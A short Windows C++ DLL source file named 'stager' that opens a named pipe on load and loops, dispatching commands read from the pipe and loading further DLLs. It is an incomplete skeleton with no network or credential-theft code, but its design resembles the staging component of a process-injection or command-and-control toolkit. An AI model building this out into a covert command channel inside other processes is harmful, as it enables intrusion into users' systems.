/******************
 This opens a pipe and loads
 other dlls
 ******************/

#include <windows.h>

#include "../common/common.h"
#include "../common/piper.h"
#include "../common/cmd.h"

#include "stager.h"

piper *my_pipe = nullptr;

void thread_main();
/*
extern "C"
__declspec(dllexport) void piper_write(const char *str)
{
    my_pipe->write(str);
}

extern "C"
__declspec(dllexport) void cmd_add(char cmd, void (*f)(const char *))
{
    cmd::add(cmd, f);
}
*/

extern "C"
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch(fdwReason){
        case DLL_PROCESS_ATTACH:
            my_pipe = new piper(MY_PIPE_NAME);
            break;
        case DLL_PROCESS_DETACH:
            //clean up here
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}

//called after pipe is constructed
void thread_main()
{
    char *str = nullptr;

    cmd::init(my_pipe);

    for(;;){
        str = my_pipe->read();
        cmd::call(*str, str + 1);

        delete[] str;
    }
}
